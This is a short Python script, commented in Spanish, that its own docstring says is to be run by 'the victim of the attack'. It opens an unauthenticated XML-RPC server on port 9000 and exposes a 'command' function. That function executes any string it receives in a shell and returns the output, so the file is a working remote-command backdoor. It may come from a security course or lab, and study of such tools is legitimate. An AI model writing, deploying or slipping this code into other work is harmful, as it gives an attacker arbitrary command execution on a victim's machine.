'''
Este programa debe ser ejecutado por la víctima del ataque
'''
from xmlrpc.server import SimpleXMLRPCServer
import subprocess

server = SimpleXMLRPCServer(('192.168.1.1', 9000))

def lanzar_comando(comando):
    result = subprocess.run(comando,capture_output=True,shell=True)
    return result.stdout

server.register_function(lanzar_comando, 'command')

try:
    print('Use Control-C to exit')
    server.serve_forever()
except KeyboardInterrupt:
    print('Exiting')
